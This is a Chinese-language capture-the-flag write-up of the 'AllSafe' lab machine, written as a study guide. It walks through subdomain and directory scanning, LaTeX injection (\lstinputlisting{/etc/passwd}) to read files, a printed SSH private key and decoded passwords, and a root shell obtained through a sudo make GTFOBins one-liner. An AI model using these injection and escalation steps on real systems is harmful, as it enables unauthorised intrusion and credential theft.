+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/266" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>1. <strong>信息收集阶段</strong></h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l         
+...
+192.168.205.136 08:00:27:e0:05:50       (Unknown)
+...</pre></div>
+<p>发现目标主机 192.168.205.136</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.136         
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+ 
+┌──(kali㉿kali)-[~]
+└─$ nmap -p2222 -sC -sV 192.168.205.136                                   
+...
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)</pre></div>
+<p>开放端口：22(SSH), 80(HTTP), 2222(SSH)</p>
+<h1>2. <strong>域名发现</strong></h1>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ddd2c407b94950fe079b78cf1c41053f2cbb7c958daced86568817a44e8f0f20/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535363232372e77656270"><img src="https://camo.githubusercontent.com/ddd2c407b94950fe079b78cf1c41053f2cbb7c958daced86568817a44e8f0f20/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535363232372e77656270" alt="image-20251019113144223" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145556227.webp" style="max-width: 100%;"></a></p>
+<p>源码中发现域名 <a href="http://allsafe.thl/" rel="nofollow">http://allsafe.thl/</a></p>
+<p>添加hosts并爆破子域名</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts             
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts                         
+192.168.205.136 allsafe.thl
+                        
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ wfuzz -c -u <span class="pl-s"><span class="pl-pds">"</span>http://allsafe.thl<span class="pl-pds">"</span></span> -H <span class="pl-s"><span class="pl-pds">"</span>HOST:FUZZ.allsafe.thl<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 560
+...
+000000058:   302      0 L     0 W        0 Ch        <span class="pl-s"><span class="pl-pds">"</span>intranet - intranet<span class="pl-pds">"</span></span>   
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo vim /etc/hosts
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts
+192.168.205.136 allsafe.thl intranet.allsafe.thl</pre></div>
+<p>发现子域：<code class="notranslate">intranet.allsafe.thl</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/08cd4fda839a6950d8a28ac3a2f5803a97a86e06197d7fe0d6da76b3105bb8d1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535363438392e77656270"><img src="https://camo.githubusercontent.com/08cd4fda839a6950d8a28ac3a2f5803a97a86e06197d7fe0d6da76b3105bb8d1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535363438392e77656270" alt="image-20251019113617538" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145556489.webp" style="max-width: 100%;"></a></p>
+<p>需要一个id和密码，去主域看看</p>
+<h1>3. <strong>目录扫描</strong></h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u 192.168.205.136        
+...
+[11:30:06] 200 -  477B  - http://192.168.205.136/assets/
+[11:30:06] 301 -  319B  - http://192.168.205.136/assets  -<span class="pl-k">&gt;</span>  http://192.168.205.136/assets/
+[11:30:07] 200 -    1KB - http://192.168.205.136/contact.php
+[11:30:08] 301 -  319B  - http://192.168.205.136/images  -<span class="pl-k">&gt;</span>  http://192.168.205.136/images/
+[11:30:08] 200 -  684B  - http://192.168.205.136/images/
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status
+[11:30:11] 403 -  280B  - http://192.168.205.136/server-status/
+[11:30:13] 301 -  318B  - http://192.168.205.136/views  -<span class="pl-k">&gt;</span>  http://192.168.205.136/views/</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/02d126af0598d4a2cd85ab39ed3308cc915fb5a1bfa773637d3cf593ba4cb420/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535333731322e77656270"><img src="https://camo.githubusercontent.com/02d126af0598d4a2cd85ab39ed3308cc915fb5a1bfa773637d3cf593ba4cb420/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535333731322e77656270" alt="image-20251019113726312" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145553712.webp" style="max-width: 100%;"></a></p>
+<p>在<code class="notranslate">our-team.php</code>找到员工ID：04779990</p>
+<p><code class="notranslate">contact.php</code>经过测试没有xxs,sql之类的</p>
+<p>扒拉一下intranet</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://intranet.allsafe.thl 
+...
+[11:40:56] 200 -  485B  - http://intranet.allsafe.thl/assets/
+[11:40:56] 301 -  329B  - http://intranet.allsafe.thl/assets  -<span class="pl-k">&gt;</span>  http://intranet.allsafe.thl/assets/
+[11:40:58] 200 -    0B  - http://intranet.allsafe.thl/db.php
+[11:40:58] 301 -  327B  - http://intranet.allsafe.thl/docs  -<span class="pl-k">&gt;</span>  http://intranet.allsafe.thl/docs/
+[11:40:58] 200 -  405B  - http://intranet.allsafe.thl/docs/
+[11:40:59] 301 -  329B  - http://intranet.allsafe.thl/images  -<span class="pl-k">&gt;</span>  http://intranet.allsafe.thl/images/
+[11:40:59] 200 -  455B  - http://intranet.allsafe.thl/images/
+[11:41:00] 200 -    1KB - http://intranet.allsafe.thl/login.php
+[11:41:02] 200 -  967B  - http://intranet.allsafe.thl/profile.php
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status
+[11:41:02] 403 -  285B  - http://intranet.allsafe.thl/server-status/
+[11:41:04] 301 -  328B  - http://intranet.allsafe.thl/views  -<span class="pl-k">&gt;</span>  http://intranet.allsafe.thl/views/</pre></div>
+<p><code class="notranslate">profile.php</code>没啥有价值的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ gobuster dir -u http://intranet.allsafe.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
+...
+/images               (Status: 301) [Size: 329] [--<span class="pl-k">&gt;</span> http://intranet.allsafe.thl/images/]
+/index.php            (Status: 302) [Size: 0] [--<span class="pl-k">&gt;</span> login.php]
+/login.php            (Status: 200) [Size: 2075]
+/profile.php          (Status: 200) [Size: 2305]
+/docs                 (Status: 301) [Size: 327] [--<span class="pl-k">&gt;</span> http://intranet.allsafe.thl/docs/]
+/assets               (Status: 301) [Size: 329] [--<span class="pl-k">&gt;</span> http://intranet.allsafe.thl/assets/]
+/customers.php        (Status: 200) [Size: 11072]
+/db.php               (Status: 200) [Size: 0]
+/logout.php           (Status: 302) [Size: 0] [--<span class="pl-k">&gt;</span> login.php]
+/process              (Status: 301) [Size: 330] [--<span class="pl-k">&gt;</span> http://intranet.allsafe.thl/process/]
+/views                (Status: 301) [Size: 328] [--<span class="pl-k">&gt;</span> http://intranet.allsafe.thl/views/]</pre></div>
+<p><code class="notranslate">customers.php</code>发现大量用户信息，但是没有密码</p>
+<p>在<code class="notranslate">/process</code>目录下发现大量疑似生成文件夹</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8e6d421679f99133d4ecf85d1e74624e8e3b134e89987bd8beaf73e0cb28b876/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535353732322e77656270"><img src="https://camo.githubusercontent.com/8e6d421679f99133d4ecf85d1e74624e8e3b134e89987bd8beaf73e0cb28b876/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535353732322e77656270" alt="image-20251019114437353" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145555722.webp" style="max-width: 100%;"></a></p>
+<p>通过查看，发现是都是“服务合同”PDF的 LaTeX 生成文件</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d42144f74cf4e4b21641180e5c056480f4047e0a60efc4514e0516dc1af91cbc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353730353733362e77656270"><img src="https://camo.githubusercontent.com/d42144f74cf4e4b21641180e5c056480f4047e0a60efc4514e0516dc1af91cbc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353730353733362e77656270" alt="image-20251019114529533" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145705736.webp" style="max-width: 100%;"></a></p>
+<p>并且通过查看<code class="notranslate">document.tex</code>，发现可以读取敏感信息</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c980a9ac095d20fb9a82d4dbcdcdf7d3f069501ed20462ee4b3e05b69b9020f9/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535373830302e77656270"><img src="https://camo.githubusercontent.com/c980a9ac095d20fb9a82d4dbcdcdf7d3f069501ed20462ee4b3e05b69b9020f9/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353535373830302e77656270" alt="image-20251019114642753" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145557800.webp" style="max-width: 100%;"></a></p>
+<p>查看了全部的pdf，都是passwd文件或者id_rsa文件，id_rsa文件都是失效的，通过passwd收获两个用户名<code class="notranslate">goddard</code> 和<code class="notranslate">parker</code></p>
+<p>结合目前的信息来看，需要先进入intranet子域的系统，继续信息收集</p>
+<p>收集了好一会，搁置了几天，因为实在找不到，后面我看到有人写wp了，瞄瞄</p>
+<h1>4. <strong>SSRF漏洞利用</strong></h1>
+<p><em>ps:<a href="https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md">https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md</a></em></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/17fe12b23d42266db025a1166fc1efa52a154255b69f7017d0578d3cc69adb0c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630303836362e77656270"><img src="https://camo.githubusercontent.com/17fe12b23d42266db025a1166fc1efa52a154255b69f7017d0578d3cc69adb0c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630303836362e77656270" alt="image-20251019115444746" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145600866.webp" style="max-width: 100%;"></a></p>
+<p>c，我试过了127.0.0.1不行，我还以为没有呢</p>
+<p>拿到一个密码<code class="notranslate">123456Seven</code></p>
+<p>尝试登录</p>
+<p>然后这里有一个问题，我的火狐浏览器访问<a href="http://intranet.allsafe.thl/login.php%E4%BC%9A%E5%87%BA%E4%B8%8D%E6%9D%A5%EF%BC%8C%E4%BD%86%E6%98%AFgoogle%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%AF%E4%BB%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E8%87%AA%E5%B7%B1%E8%A7%A3%E5%86%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%90%A7" rel="nofollow">http://intranet.allsafe.thl/login.php会出不来，但是google浏览器可以，所以自己解决一下这个问题吧</a></p>
+<pre class="notranslate"><code class="notranslate">0-477-9990
+123456Seven
+</code></pre>
+<p>登录成功</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/883d92db4c1a4cd6ff568afd7b75b3b7d80e9f9cae58ea56570c7ef6eedca79e/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630343633302e77656270"><img src="https://camo.githubusercontent.com/883d92db4c1a4cd6ff568afd7b75b3b7d80e9f9cae58ea56570c7ef6eedca79e/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630343633302e77656270" alt="image-20251019115848173" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145604630.webp" style="max-width: 100%;"></a></p>
+<p>加载的也不是很完整，不管了能用就行</p>
+<h1>5. <strong>LaTeX注入读取SSH密钥</strong></h1>
+<p>我们已知Empresa字段可以通过<code class="notranslate">\lstinputlisting{/etc/passwd}</code>读取文件，我们尝试读取那两个用户的ssh私钥</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ebd9913b7347f45eac1b86ad2580df0e09413400c93de1e71ef788b6970425d1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353731313833302e77656270"><img src="https://camo.githubusercontent.com/ebd9913b7347f45eac1b86ad2580df0e09413400c93de1e71ef788b6970425d1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353731313833302e77656270" alt="image-20251019121327471" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145711830.webp" style="max-width: 100%;"></a></p>
+<p>然后生成了，死活不出东西，我去看process的生成文件，发现</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/572786ae7d77e3ea00810a7e2ac1b088c95a226dbc8c66642357c898ae4aa363/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630393739302e77656270"><img src="https://camo.githubusercontent.com/572786ae7d77e3ea00810a7e2ac1b088c95a226dbc8c66642357c898ae4aa363/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353630393739302e77656270" alt="image-20251019121410361" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145609790.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/185ce9e2f9c73afa5e6a58c3b9366674ca72673181563499bd67483febbc56ab/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353631333133312e77656270"><img src="https://camo.githubusercontent.com/185ce9e2f9c73afa5e6a58c3b9366674ca72673181563499bd67483febbc56ab/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353631333133312e77656270" alt="image-20251019121428663" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145613131.webp" style="max-width: 100%;"></a></p>
+<p>他前端搞反了，我们也调整一下</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d18a146fa65e7583b4fbf9956f4ac00552037fda4a0d91b8182d854c6fc1fcf2/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353631343739382e77656270"><img src="https://camo.githubusercontent.com/d18a146fa65e7583b4fbf9956f4ac00552037fda4a0d91b8182d854c6fc1fcf2/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353631343739382e77656270" alt="image-20251019120804269" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145614798.webp" style="max-width: 100%;"></a></p>
+<p>parker的也类似</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/eb52afc27bd7b60b3e9114b6a8e2d6c44319d36f3a342fc8851a6c284aedf3c1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632303230332e77656270"><img src="https://camo.githubusercontent.com/eb52afc27bd7b60b3e9114b6a8e2d6c44319d36f3a342fc8851a6c284aedf3c1/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632303230332e77656270" alt="image-20251019120956589" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145620203.webp" style="max-width: 100%;"></a></p>
+<p>parker的私钥出货了</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f7952e5b73e0cea287620ce2d324388869dc59a32da1a7380a25219545d4db5a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632323235392e77656270"><img src="https://camo.githubusercontent.com/f7952e5b73e0cea287620ce2d324388869dc59a32da1a7380a25219545d4db5a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393134353632323235392e77656270" alt="image-20251019121518491" data-canonical-src="http://7r1UMPHK.github.io/image/20251019145622259.webp" style="max-width: 100%;"></a></p>
+<p>直接复制出来的是有问题的，我们慢慢处理一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat /tmp/id_rsa <span class="pl-k">|</span> sed <span class="pl-s"><span class="pl-pds">'</span>1b; $b; s/ //g<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/id_rsa1
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa1                               
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa1   
+Load key <span class="pl-s"><span class="pl-pds">"</span>/tmp/id_rsa1<span class="pl-pds">"</span></span>: error <span class="pl-k">in</span> libcrypto
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat -A /tmp/id_rsa1
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RBEGIN OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$
+...
+M-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^REND OPENSSH PRIVATE KEYM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^RM-bM-^HM-^R$</pre></div>
+<p>头尾问题，去复制一个标准的就好了</p>
+<p>完美的id_rsa</p>
+<pre class="notranslate"><code class="notranslate">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAmGqHh2o84MpOxktbDf6ENwqdz7xQ4XqZbut/nxIfpevyszfP0kOM
+edI2pX+vZVVTzxJ3GumZYArNWeFScOI90ZCU8bylIihC0i/450XzzN86SgNkOeFIjK5uiU
+78ATZwuJVqRNspyAg4qpohBt43SiJ2ILL75u5lPBzFX9rfeW9kpxU+nuR6P/wTpcqFgZWT
+TuSwfEudYAmBOtG01hrfgtVZzBZ8eqNCjIZmx7HQkeny+sOMdTwkKp8PuBqMyag4E/PYFR
+HF7MunDmbvh0V163FatZYQippXsr3iTt7NT0qOxqNk+kvvWWbbRGBN9VHDByyNC20Hj7W0
+RALgwYDmrwAAA8gz5lrPM+ZazwAAAAdzc2gtcnNhAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp
+3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUi
+KELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HM
+Vf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR
+6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2
+T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOavAAAAAwEAAQAAAQA7FUi2YKN6zFHfIoUI
+lrowEAh+59Q+o+Toj5foVQE5s45glOkV7CN/cdLHMwkN8hbL9a+AGj/fcDCMgAESS1GFdF
+OYpfUpmYvVqM0G8iIBMCOLX2cx3Lff+RpWVezwl2b41srcKE05Ap7c22SkIe4y6cr7AAcQ
+TSenNsv4TYNFsiRzVDUwISqlp3EhFWPe1GClasPahS3pEDcNiMwRh8mPt7HRG9HqLEPhWv
+9qTpoCnnc30s4Wo9QipdtcxvHrrEPVVrwcz3SJnlCLTlYjiBHZ+gGBl73crSZJOlxNAiow
+A85FBKi6FrWaA3WXrKdCFEh3atKGg5I8kCGhxBkpjn8ZAAAAgCo8745ADp4U7gibCuKs5N
+g7JYWuJDZCYyEClHkWJYdb6CluTJx9DOw0i28Ip8FM8P0YQclTMlU21pwVj1eVXk/5D3kg
+bsBO4hfcSoqewOG0H5U44aiey01z38kz0PL6Z/6JGMzEuSvlHKTJgCGaQSrFcC1X/57LOp
+pViYAqrNC5AAAAgQDPNORYZS8OywkcFN2LZe3uHa4EFZPytnzcPcnQeGWwVqm/12D10vPR
+yeTA0lvIKYkWcClPmiM3/CFQdWPwTyMGryyMv+5+lVJEi0dfHa02jCYKH87pVH35UF6ZPB
+TgvhsrQRFX12vSk/DO30Aa15P/GT4XceHEdM6GlXkOBtILjQAAAIEAvE6vGGynNroa34mv
+cuLE4hu5zK8t167MUX6zNgPDmmoUTwHIRL43ErUo+KpQf1yS3S70Q6xfTQjaxo9S5QuQMR
+CsEojTarhvJ7+VxSKpjjju9Nmuxd2d2vrEPTgrOSijimjkjWK6OhZgemGoKoDUpOf2j8kv
+mKzxF43kdEiETisAAAARcm9vdEAwOTk2MGRmYjE3OGUBAg==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<h1>6. <strong>SSH登录与横向移动</strong></h1>
+<p>尝试利用</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ vim /tmp/id_rsa
+                       
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa 
+                                                                           
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh-keygen -y -f /tmp/id_rsa 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUiKELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HMVf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOav root@09960dfb178e
+                               
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh parker@192.168.205.136  -i /tmp/id_rsa1
+parker@192.168.205.136<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s"></span>
+<span class="pl-s">┌──(kali㉿kali)-[/tmp]</span>
+<span class="pl-s">└─$ ssh parker@192.168.205.136 -p 2222 -i /tmp/id_rsa1</span>
+<span class="pl-s">parker@153504fd9bcb:~$ id</span>
+<span class="pl-s">uid=1001(parker) gid=1001(parker) groups=1001(parker)</span></pre></div>
+<p>横向移动</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">parker@153504fd9bcb:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+parker@153504fd9bcb:<span class="pl-k">~</span>$ ls -al
+total 24
+drwx---r-x 1 parker parker 4096 Aug 24 18:39 <span class="pl-c1">.</span>
+drwxr-xr-x 1 root   root   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  220 Jul 30 19:28 .bash_logout
+-rw-r--r-- 1 parker parker 3526 Jul 30 19:28 .bashrc
+-rw-r--r-- 1 parker parker  807 Jul 30 19:28 .profile
+drwxr-xr-x 1 parker parker 4096 Aug 24 18:39 .ssh
+parker@153504fd9bcb:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /home/
+parker@153504fd9bcb:/home$ ls -al
+total 16
+drwxr-xr-x 1 root    root    4096 Aug 24 18:39 <span class="pl-c1">.</span>
+drwxr-xr-x 1 root    root    4096 Oct 11 18:41 ..
+drwx------ 2 goddard goddard 4096 Aug 24 18:39 goddard
+drwx---r-x 1 parker  parker  4096 Aug 24 18:39 parker
+parker@153504fd9bcb:/home$ find / -user <span class="pl-s"><span class="pl-pds">$(</span>whoami<span class="pl-pds">)</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/proc/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/sys/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/run/*<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
+/home/parker
+/home/parker/.ssh
+/home/parker/.ssh/id_rsa.pub
+/home/parker/.ssh/id_rsa
+/home/parker/.ssh/authorized_keys
+/home/parker/.bash_logout
+/home/parker/.bashrc
+/home/parker/.profile
+/dev/pts/0
+/var/mail/parker
+/var/mail/parker/meeting
+parker@153504fd9bcb:/home$ <span class="pl-c1">cd</span> /var/mail/parker
+parker@153504fd9bcb:/var/mail/parker$ ls -la
+total 12
+drwxr-sr-x 2 parker parker 4096 Aug 24 18:39 <span class="pl-c1">.</span>
+drwxrwsr-x 1 root   mail   4096 Aug 24 18:39 ..
+-rw-r--r-- 1 parker parker  898 Aug 24 18:39 meeting
+parker@153504fd9bcb:/var/mail/parker$ cat meeting
+From goddard@localhost Thu Aug 21 14:05:20 2025
+Date: Thu, 21 Aug 2025 14:05:20 +0000
+From: goddard@localhost
+To: parker@localhost
+Subject: Reunión con E-Corp
+MIME-Version: 1.0
+Content-Type: multipart/mixed<span class="pl-k">;</span> boundary=<span class="pl-s"><span class="pl-pds">"</span>BOUNDARY<span class="pl-pds">"</span></span>
+
+--BOUNDARY
+Content-Type: text/plain<span class="pl-k">;</span> charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Hola Oliver,
+
+Te adjunto las notas que armé para la reunión con el cliente.  
+Revisalo y confirmame si llegamos con todo.
+
+Saludos,  
+Gideon
+
+--BOUNDARY
+Content-Type: text/plain<span class="pl-k">;</span> name=<span class="pl-s"><span class="pl-pds">"</span>meeting_notes.txt<span class="pl-pds">"</span></span>
+Content-Disposition: attachment<span class="pl-k">;</span> filename=<span class="pl-s"><span class="pl-pds">"</span>meeting_notes.txt<span class="pl-pds">"</span></span>
+Content-Transfer-Encoding: 7bit
+
+Meeting Notes - E-Corp
+----------------------
+1. Confirmar agenda con el cliente.
+2. Revisar documentación técnica.
+3. Validar acceso al portal con la credencial:
+
+   Clave de acceso: 6D7033386E71556654416130494D314F70306157
+
+4. Preparar demo corta del servicio.
+--BOUNDARY--
+EOF.          </pre></div>
+<p>利用<a href="https://gchq.github.io/CyberChef/" rel="nofollow">https://gchq.github.io/CyberChef/</a> hex解出<code class="notranslate">mp38nqUfTAa0IM1Op0aW</code></p>
+<h1>7. <strong>容器内提权</strong></h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">parker@153504fd9bcb:/home$ su goddard
+Password: 
+goddard@153504fd9bcb:/home$ id
+uid=1000(goddard) gid=1000(goddard) groups=1000(goddard)
+goddard@153504fd9bcb:/home$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> goddard on 153504fd9bcb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User goddard may run the following commands on 153504fd9bcb:
+    (ALL) NOPASSWD: /usr/bin/make</pre></div>
+<p><em>ps:<a href="https://gtfobins.github.io/gtfobins/make/#sudo" rel="nofollow">https://gtfobins.github.io/gtfobins/make/#sudo</a></em></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">goddard@153504fd9bcb:/home$ sudo make -s --eval=<span class="pl-s"><span class="pl-pds">$'</span>x:<span class="pl-cce">\n\t</span>-<span class="pl-pds">'</span></span><span class="pl-s"><span class="pl-pds">"</span>/bin/bash<span class="pl-pds">"</span></span>
+root@153504fd9bcb:/home# id
+uid=0(root) gid=0(root) groups=0(root)
+root@153504fd9bcb:/home# <span class="pl-c1">cd</span>
+root@153504fd9bcb:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls -al</span>
+total 24
